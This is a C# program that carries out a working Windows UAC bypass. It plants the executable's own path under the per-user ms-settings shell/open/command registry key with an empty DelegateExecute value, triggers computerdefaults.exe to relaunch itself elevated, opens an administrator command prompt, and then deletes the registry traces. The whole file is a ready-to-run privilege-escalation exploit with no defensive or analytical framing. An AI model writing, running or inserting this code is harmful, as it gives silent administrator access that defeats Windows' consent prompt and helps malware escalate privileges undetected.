using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Reflection;
using System.IO;

public class Z
{
    public static void Main(string[] args)
    {
        A1();
    }

    public static void A1()
    {
        bool isUserAdmin = CheckIfAdmin();
        string appPath = Assembly.GetExecutingAssembly().Location;
        M($"Current executable path: {appPath}");

        if (!isUserAdmin)
        {
            M("User lacks administrator rights. Attempting UAC bypass...");
            AlterRegistryAndExecute(appPath);
            M("Bypass triggered. Exiting original process...");
            Environment.Exit(0); // Exit non-admin process after bypass attempt
        }
        else
        {
            M("User already has administrator rights. Cleaning up registry...");
            ClearRegistry();
            M("Launching a new terminal window...");
            Process.Start("cmd.exe"); // Runs as admin in elevated context
            M("Terminal launched. Execution complete. Press Enter to exit.");
            Console.ReadLine();
        }
    }

    public static bool CheckIfAdmin()
    {
        bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        M($"Is the user an admin? {isAdmin}");
        return isAdmin;
    }

    public static void AlterRegistryAndExecute(string appPath)
    {
        try
        {
            string regPath = "Classes\\ms-settings\\shell\\open\\command";
            GenerateRegistryKeys(regPath);
            M("Registry keys generated.");

            RegistryKey regKey = ModifyRegKey(regPath);
            M($"Setting registry to execute: {appPath}");

            regKey.SetValue("", appPath, RegistryValueKind.String);
            regKey.SetValue("DelegateExecute", "", RegistryValueKind.String);
            M($"Registry set. Default: {regKey.GetValue("")}, DelegateExecute: {regKey.GetValue("DelegateExecute")}");

            regKey.Close();
            M("Registry key closed.");

            ExecuteElevated();
            M("Elevation triggered. Original process will exit shortly...");
        }
        catch (Exception ex)
        {
            M($"Error during bypass: {ex.Message}");
            ClearRegistry(); // Cleanup even on error
        }
    }

    public static void GenerateRegistryKeys(string basePath)
    {
        M("Creating registry keys...");
        string[] paths = basePath.Split('\\');
        string currentPath = "";
        foreach (string part in paths)
        {
            currentPath = currentPath.Length > 0 ? $"{currentPath}\\{part}" : part;
            ModifyRegKey(currentPath);
        }
    }

    public static RegistryKey ModifyRegKey(string path)
    {
        M($"Accessing registry key: Software\\{path}");
        RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\" + path, true);

        if (regKey == null)
        {
            M($"Key 'Software\\{path}' not found. Creating...");
            regKey = Registry.CurrentUser.CreateSubKey("Software\\" + path);
        }
        else
        {
            M($"Key 'Software\\{path}' exists.");
        }

        return regKey;
    }

    public static void ExecuteElevated()
    {
        M("Launching computerdefaults.exe for elevation...");
        Process.Start(new ProcessStartInfo
        {
            FileName = "computerdefaults.exe",
            UseShellExecute = true, // Direct launch to respect registry
            CreateNoWindow = true
        });
        M("Elevation process initiated.");
    }

    public static void ClearRegistry()
    {
        try
        {
            M("Cleaning up registry...");
            string regPath = "Classes\\ms-settings\\shell\\open\\command";
            RegistryKey regKey = ModifyRegKey(regPath);
            regKey.SetValue("", "", RegistryValueKind.String);
            regKey.DeleteValue("DelegateExecute", false);
            M($"Registry cleared. Default: {regKey.GetValue("")}, DelegateExecute: {(regKey.GetValue("DelegateExecute") ?? "not set")}");

            regKey.Close();
            M("Registry key closed.");

            try
            {
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\ms-settings", false);
                M("Deleted 'ms-settings' key tree.");
            }
            catch (Exception ex)
            {
                M($"Could not delete key tree: {ex.Message}");
            }
        }
        catch (Exception ex)
        {
            M($"Error during cleanup: {ex.Message}");
        }
    }

    public static void M(string message)
    {
        Console.WriteLine(message);
    }
}